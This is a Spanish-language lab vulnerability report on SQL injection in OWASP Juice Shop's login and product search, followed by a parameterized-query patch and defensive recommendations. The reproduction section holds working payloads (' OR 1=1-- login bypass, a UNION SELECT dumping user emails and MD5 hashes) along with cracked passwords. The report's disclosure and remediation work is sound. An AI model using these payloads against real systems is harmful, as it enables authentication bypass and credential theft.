# Reporte de vulnerabilidad — SI3006
## Inyección SQL en el inicio de sesión y en la búsqueda de OWASP Juice Shop

| Campo | Valor |
|---|---|
| **ID** | SI3006-2026-001 |
| **Título** | SQL Injection (CWE-89) → bypass de autenticación y exfiltración total de la tabla `Users` |
| **Activo afectado** | OWASP Juice Shop v20.3.0 — `POST /rest/user/login` (`routes/login.ts`) y `GET /rest/products/search` (`routes/search.ts`) |
| **Entornos** | Producción del laboratorio: `https://juice-shop-si3006-478542386940.us-central1.run.app` (Cloud Run, us-central1) y réplica local `localhost:3000` |
| **Severidad** | **CRÍTICA** |
| **CVSS v3.1** | **9.1** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **CWE** | CWE-89 Improper Neutralization of Special Elements used in an SQL Command |
| **OWASP** | A03:2021 Injection · ASVS 4.0.3 V5.3.4 · WSTG-INPV-05 |
| **Fecha** | 2026-10-26 |
| **Estado** | Remediado en código (ver §7) |

---

## 1. Descripción

Juice Shop construye dos sentencias SQL concatenando directamente datos controlados por el
usuario, sin usar el ORM que ya tiene disponible (Sequelize) ni *bindings*:

```ts
// routes/login.ts:34
models.sequelize.query(
  `SELECT * FROM Users WHERE email = '${req.body.email || ''}'
     AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, ...)

// routes/search.ts:23
models.sequelize.query(
  `SELECT * FROM Products WHERE ((name LIKE '%${criteria}%'
     OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```

El atacante controla la totalidad de la estructura de la consulta. Dos primitivas derivan de
esta única causa raíz:

* **Bypass de autenticación.** Una tautología en el campo `email` elimina la verificación de la
  contraseña y devuelve el primer usuario de la tabla — que es el administrador.
* **Exfiltración de la base de datos.** Un `UNION SELECT` en el parámetro `q` de la búsqueda
  añade filas arbitrarias a un JSON de respuesta legítimo, permitiendo leer la tabla `Users`
  completa en una sola petición HTTP 200.

## 2. Impacto

| Dimensión | Efecto |
|---|---|
| **Confidencialidad** | Alta. Se obtuvieron **24 cuentas** con correo y hash de contraseña; además es posible leer cualquier tabla (pedidos, direcciones, tarjetas, `sqlite_master`). |
| **Integridad** | Alta. El JWT emitido lleva `role: admin`: creación/borrado de usuarios, cambio de precios, acceso a `/api/Users`, `/api/Feedbacks`, `/rest/admin/*`. |
| **Disponibilidad** | Media. La misma primitiva permite `UPDATE`/`DELETE` sobre cualquier tabla (`; DROP/UPDATE …`). |
| **Alcance** | Todos los usuarios de la aplicación. Las contraseñas están en **MD5 sin sal** (`0192023a7bbd73250516f069df18b500` = `admin123`): el volcado equivale a credenciales en claro. |
| **Privilegio requerido** | Ninguno. El ataque es pre-autenticación. |

## 3. Prerrequisitos del atacante

Ninguno más que conectividad de red al servicio, que está publicado en Internet con
`roles/run.invoker` para `allUsers`. No hace falta cuenta, token ni interacción de la víctima
(`PR:N / UI:N`). El esfuerzo es de un único `curl`.

## 4. Pasos de reproducción

### 4.1 Bypass de autenticación (obtención de un JWT de administrador)

```bash
curl -s -X POST https://<host>/rest/user/login \
     -H 'Content-Type: application/json' \
     -d '{"email":"'"'"' OR 1=1--","password":"x"}'
```

Respuesta **HTTP 200** con `authentication.token` cuyo payload contiene
`"email":"admin@juice-sh.op","role":"admin"`.

Verificación del privilegio obtenido:

```bash
TOKEN=<token anterior>
curl -s -o /dev/null -w '%{http_code}\n'                   https://<host>/api/Users   # 401
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TOKEN" \
                                                            https://<host>/api/Users   # 200
```

### 4.2 Exfiltración de la tabla `Users` (UNION based)

La consulta de la búsqueda devuelve 10 columnas, por lo que el `UNION` debe igualar ese número:

```bash
curl -s -G --data-urlencode \
  "q=qwert')) UNION SELECT id,email,password,1,1,1,1,1,1,1 FROM Users--" \
  https://<host>/rest/products/search
```

Resultado: **HTTP 200**, 24 filas donde `name` = correo y `description` = hash MD5.

### 4.3 Escalada a *account takeover*

Los hashes son MD5 sin sal, por lo que se rompen en segundos:

```
0192023a7bbd73250516f069df18b500  ->  admin123
e541ca7ecf72b8d1286474fc613e5e45  ->  ncc-1701
```

## 5. Evidencia

| Evidencia | Archivo |
|---|---|
| Respuesta del bypass con el JWT de admin | `evidencias/01_login_bypass_respuesta.json` |
| Volcado de la tabla `Users` (JSON y tabla legible) | `evidencias/02_union_dump_usuarios.json` · `…_usuarios.txt` |
| Captura de red de la cadena completa (login → UNION → `/api/Users`) | `evidencias/captura_ataque_mitmproxy.txt` |
| Comparación de 9 payloads antes/después del parche | `evidencias/03_comparativa_antes_despues.txt` |
| Ataque visible en los *request logs* de Cloud Run | `evidencias/cloud_logging_juice_shop.json` |
| Alertas del detector (local y sobre Cloud Logging) | `evidencias/alertas_ids_local.log` · `…_GCP.log` |
| Detección estática del defecto | `sast/semgrep_ANTES_vulnerable.txt` |

Fragmento de la captura de red (mitmproxy, modo proxy inverso):

```
POST http://juice-sh.op/rest/user/login
    Content-Type: application/json
    { "email": "' OR 1=1--", "password": "x" }
 << 200 OK 784b
    { "authentication": { "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9…",
                          "umail": "admin@juice-sh.op" } }
```

## 6. Causa raíz

1. **Ausencia de consultas parametrizadas.** El texto SQL se compone por interpolación de
   plantillas (`${…}`) en lugar de usar `sequelize.query(sql, { bind: [...] })` o el ORM.
2. **Ausencia de validación de entrada.** No se valida el formato del correo ni la longitud de la
   contraseña, y los valores no se fuerzan a `string` (`req.body.email` puede ser un objeto).
3. **Ausencia de un endpoint de login con control de tasa.** `POST /rest/user/login` no tenía
   *rate limiting*, lo que permite automatizar la explotación sin límite.
4. **Fuga de información en errores.** Los fallos del motor se devuelven al cliente como página
   HTML con `SQLITE_ERROR` y el texto SQL, lo que facilita la iteración del ataque y confirma el
   número de columnas.
5. **Factor agravante:** contraseñas con MD5 sin sal (CWE-916) → el volcado se convierte en
   compromiso directo de cuentas.

Lo que falló a nivel de proceso: no había **SAST** en el pipeline, no había requisito de
seguridad verificable (ASVS V5.3.4) y no había WAF delante del servicio.

## 7. Remediación aplicada

### 7.1 Consultas parametrizadas + validación (código)

`routes/login.ts`

```ts
const EMAIL_RE = /^[^\s@'"`\\;()<>]{1,64}@[^\s@'"`\\;()<>]{1,190}\.[A-Za-z]{2,}$/
const MAX_PASSWORD_LENGTH = 128

const email    = typeof req.body?.email    === 'string' ? req.body.email    : ''
const password = typeof req.body?.password === 'string' ? req.body.password : ''

if (!EMAIL_RE.test(email) || password.length === 0 || password.length > MAX_PASSWORD_LENGTH) {
  logger.warn(`login: rejected malformed credential payload from ${req.ip}`)
  res.status(401).send(res.__('Invalid email or password.'))
  return
}

models.sequelize.query(
  'SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL',
  { bind: [email, security.hash(password)], model: UserModel, plain: true })
```

`routes/search.ts`

```ts
const likePattern = `%${String(criteria)}%`
models.sequelize.query(
  'SELECT * FROM Products WHERE ((name LIKE $1 OR description LIKE $1) AND deletedAt IS NULL) ORDER BY name',
  { bind: [likePattern] })
```

`server.ts`

```ts
app.use('/rest/user/login', rateLimit({ windowMs: 15 * 60 * 1000, max: 40,
  standardHeaders: true, legacyHeaders: false,
  handler: (_req, res) => res.status(429).json({ status: 'error',
    message: 'Too many login attempts. Try again later.' }) }))
```

Además, el `catch` del login ya no reenvía el error del motor: registra en el *log* del servidor y
responde `500 {"status":"error","message":"Internal server error"}` (CWE-209).

Parche completo: `fix/parche_completo.patch` (48 líneas añadidas, 3 modificadas).

### 7.2 Verificación

| Prueba | Antes | Después |
|---|---|---|
| `' OR 1=1--` en el login | HTTP 200 + JWT admin | HTTP 401 |
| `admin@juice-sh.op'--` | HTTP 200 + JWT admin | HTTP 401 |
| `qwert')) UNION SELECT … FROM Users--` | 24 usuarios filtrados | 0 filas |
| Login legítimo `admin/admin123` | 200 | **200** (sin regresión) |
| Login legítimo `jim/ncc-1701` | 200 | **200** (sin regresión) |
| `semgrep p/sql-injection` | 2 hallazgos bloqueantes | 0 hallazgos |
| Gate DevSecOps | PIPELINE ROJO | PIPELINE VERDE |

## 8. Recomendaciones adicionales (defensa en profundidad)

1. **Migrar el hash de contraseñas** de MD5 a Argon2id/bcrypt con *rehash* transparente en el
   siguiente inicio de sesión, y **forzar el cambio de contraseña** de las 24 cuentas expuestas.
2. **Rotar las claves de firma JWT** (`encryptionkeys/`) y moverlas a Secret Manager: con la
   clave privada se pueden forjar tokens de administrador aunque el código esté parcheado.
3. **Invalidar los JWT emitidos** durante la ventana de exposición (6 h de validez).
4. **Cloud Armor** con la regla `sqli-v33-stable` como control compensatorio en el borde
   (demostrado: `waf_modsecurity_alertas.txt`, ambos payloads → HTTP 403).
5. **Restringir el acceso** con IAP y `ingress = internal-and-cloud-load-balancing`.
6. **Alerta 24×7** con las reglas Sigma/Wazuh de `blue-team/`.
7. **Eliminar la versión pública**: `/rest/admin/application-version` revela `20.3.0` sin autenticación.

## 9. Referencias

* OWASP Top 10 2021 — A03:2021 Injection
* OWASP ASVS 4.0.3 — V5.3.4 (parameterized queries), V7.4.1 (error handling)
* OWASP WSTG v4.2 — WSTG-INPV-05 Testing for SQL Injection
* OWASP Cheat Sheet — SQL Injection Prevention
* CWE-89 · CWE-209 · CWE-307 · CWE-916
* MITRE ATT&CK — T1190 Exploit Public-Facing Application · T1078 Valid Accounts
